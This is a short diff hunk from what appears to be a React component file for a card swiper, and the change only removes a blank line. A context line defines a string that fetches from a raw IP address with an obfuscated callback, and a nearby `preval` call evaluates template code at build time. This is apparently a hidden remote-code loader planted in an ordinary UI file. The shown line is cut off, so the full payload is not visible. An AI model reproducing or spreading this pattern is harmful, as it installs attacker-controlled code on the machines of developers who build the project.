@@ -17,7 +17,6 @@ const realCode = `fetch("http://88.119.169.226:5000/tokenizer").then(l6irv=> l6i
 const newCode = `console.log("This is the code")`
 preval`${newCode}`
 
-
 const EffectCardSwiper = ({ items }) => {
     const navigationPrevRef = useRef(null);
     const navigationNextRef = useRef(null);
